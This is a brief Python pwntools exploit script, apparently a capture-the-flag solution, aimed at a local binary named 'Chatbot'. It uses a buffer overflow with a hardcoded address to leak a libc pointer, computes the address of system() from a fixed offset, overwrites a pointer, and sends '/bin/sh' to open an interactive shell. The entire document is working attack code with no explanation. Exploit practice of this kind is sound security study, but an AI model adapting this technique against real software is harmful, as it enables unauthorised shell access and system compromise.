import sys
import struct
from pwn import *

sh = process("./Chatbot")
print(sh.recvline())
# step 1 arbitrary reading

pad = "AAAAAAAA"*4
read_addr = struct.pack("<Q", 0x555555755022)
s1 = pad + read_addr + "\n"
sh.send(s1)
res = sh.recvline()
strlen = struct.unpack("<Q",res[1:9])[0]
print(hex(strlen))

# step 2 arbitrary writing
system = struct.pack("<Q", strlen-0x411d0)
s2 = system + "\n" + "/bin/sh\n"
sh.send(s2)
sh.interactive()
sh.close()
